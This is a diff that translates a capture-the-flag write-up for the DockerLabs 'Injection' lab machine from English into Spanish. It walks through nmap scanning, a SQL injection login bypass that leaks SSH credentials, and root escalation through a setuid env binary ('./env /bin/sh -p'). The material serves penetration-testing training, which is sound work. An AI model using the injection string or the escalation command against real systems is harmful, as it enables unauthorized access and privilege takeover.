@@ -1,10 +1,10 @@
-# Write Up Injection
+# Writeup Injection
 
 **Difficulty:** Super easy<br>
-**Link to dockerlabs:** https://dockerlabs.es/
+**Dockerlabs link:** [https://dockerlabs.es/](https://dockerlabs.es/)
 
-## Setting the enviroment
-First of all we deploy the machine with the script that comes when downloading the machine
+## Preparando el entorno
+Lo primero es desplegar la máquina con el script que viene al descargarla:
 ```
 ❯ chmod +x auto_deploy.sh
 ❯ sudo ./auto_deploy.sh injection.tar
@@ -16,7 +16,7 @@ Máquina desplegada, su dirección IP es -→ 172.17.0.2
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
 ```
 
-Once deployed, we create the injection folder, go inside and use the *mkt* utility that creates the *nmap*, *content*, *exploits* and *scripts* folders.
+Una vez desplegada, creamos la carpeta injection, entramos y usamos la utilidad *mkt* que crea las carpetas *nmap*, *content*, *exploits* y *scripts*.
 
 ```
 ❯ mkdir injection-dockerlabs
@@ -29,7 +29,7 @@ drwxrwxr-x godack godack 4.0 KB Fri Aug 15 17:03:20 2025 nmap
 drwxrwxr-x godack godack 4.0 KB Fri Aug 15 17:03:20 2025 scripts
 ```
 ## Recon
-The first thing that we do is a general reconnaissance with nmap over the victym machine, with the purpose to obtain the open ports.
+Lo primero que hacemos es un reconocimiento general con nmap sobre la máquina víctima para obtener los puertos abiertos.
 ```
 ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
 
@@ -37,7 +37,7 @@ PORT   STATE SERVICE REASON
 22/tcp open  ssh     syn-ack ttl 64
 80/tcp open  http    syn-ack ttl 64
 ```
-Once we have obtained the open ports we can do an exhaustive scan with recon scripts with the purpose to obtain the services that are running on each port and their's version.
+Una vez obtenidos los puertos abiertos hacemos un escaneo exhaustivo con scripts de recon para obtener los servicios que corren en cada puerto y su versión.
 
 ```
 ❯ extractPorts allPorts
@@ -72,10 +72,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 7.31 seconds
 ```
 
-In this way we discovered that the service running on port 22 (FTP port) is OpenSSH 8.9p1 and on port 80 (http port) an Apache httpd 2.4.52 web service is running.
+Así descubrimos que en el puerto 22 corre OpenSSH 8.9p1 y en el puerto 80 (puerto http) corre un servicio web Apache httpd 2.4.52.
 
-## Exploit
-As we have seen that there is a web service running on the victim machine, we proceed to view the web, adding the domain (in this case it does not have one and we will simply put the name of the machine) to the */etc/hosts* file of our virtual machine (it is the local DNS configuration file).
+## Explotación
+Como hemos visto que hay un servicio web corriendo en la máquina víctima, vamos a ver la web, añadiendo el dominio (en este caso no tiene y pondremos simplemente el nombre de la máquina) al fichero */etc/hosts* de nuestra máquina virtual (es el fichero de configuración DNS local).
 
 ```
 ❯ sudo vi /etc/hosts
@@ -91,24 +91,24 @@ ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 ```
 
-Once the */etc/hosts* file is configured, we proceed to access the website, and we see that it is a login form.
+Una vez configurado el fichero */etc/hosts*, accedemos a la web y vemos que es un formulario de login.
 
 ![Web](../../images/writeups/injection-login.png)
 
-Let's try entering the basic parameters to check for SQL injection. To do this, enter the string *admin' OR '1' = '1'; --* in the username section and anything else for password (in my case, I put *hacked!*) to allow the form to be submitted. If everything goes well, you'll be able to log in as the administrator (if it doesn't work with the admin user, you can change it to root, administrator, and similar, but without wasting too much time).
+Probamos a meter los parámetros básicos para comprobar si hay SQL injection. Para ello metemos la cadena *admin' OR '1' = '1'; --* en el usuario y cualquier cosa en la contraseña (en mi caso puse *hacked!*) para poder enviar el formulario. Si todo va bien, entraremos como administrador (si no funciona con admin se puede probar con root, administrator y similares, pero sin perder mucho tiempo).
 
 ```
 User: admin' OR '1' = '1'; --
 Password: hacked!
 ```
 
-And bingo! We're in and we get Dylan's credentials.
+¡Y bingo! Entramos y obtenemos las credenciales de Dylan.
 
 ```
 Bienvenido Dylan! Has insertado correctamente tu contraseña: KJSDFG789FGSDF78
 ```
 
-Having obtained these credentials, we can try to access through the also open ssh port.
+Con estas credenciales, podemos probar a entrar por el puerto ssh que también está abierto.
 
 ```
 ssh dylan@injection
@@ -116,11 +116,11 @@ dylan@injection's password: (aquí ponemos el password)
 dylan@6b329dffcb35:~$ 
 ```
 
-And we alredy get access to the machine!
+¡Y ya tenemos acceso a la máquina!
 
-## Privilege escalation
+## Escalada de privilegios
 
-To be able to use the console in a more comfortable way we can do the following treatment of the terminal:
+Para usar la consola de forma más cómoda podemos hacer el siguiente tratamiento de la terminal:
 
 ```
 script /dev/null -c bash
@@ -129,7 +129,7 @@ reset xterm
 export TERM=xterm
 ```
 
-Now that we have a terminal we look for files (preferably binary) with the root user and the *setuid* flag active and we find the following:
+Ahora que tenemos una terminal buscamos ficheros (mejor binarios) con usuario root y flag *setuid* activo y encontramos lo siguiente:
 
 ```
 dylan@6b329dffcb35:/bin$ find / -perm -4000 -user root 2>/dev/null
@@ -146,7 +146,7 @@ dylan@6b329dffcb35:/bin$ find / -perm -4000 -user root 2>/dev/null
 /usr/bin/chsh
 ```
 
-So we use the env command as follows and elevate privileges to root
+Así que usamos el comando env de la siguiente forma y escalamos privilegios a root:
 
 ```
 dylan@6b329dffcb35:/bin$ ./env /bin/sh -p
@@ -155,8 +155,8 @@ root
 # 
 ```
 
-## Lessons Learned
-1. Scans with **nmap**
-2. Simple SQL injection
-3. Searching for binaries with active *setuid*
-4. Privilege escalation with **env**
+## Lecciones aprendidas
+1. Escaneos con **nmap**
+2. SQL injection simple
+3. Búsqueda de binarios con *setuid* activo
+4. Escalada de privilegios con **env**
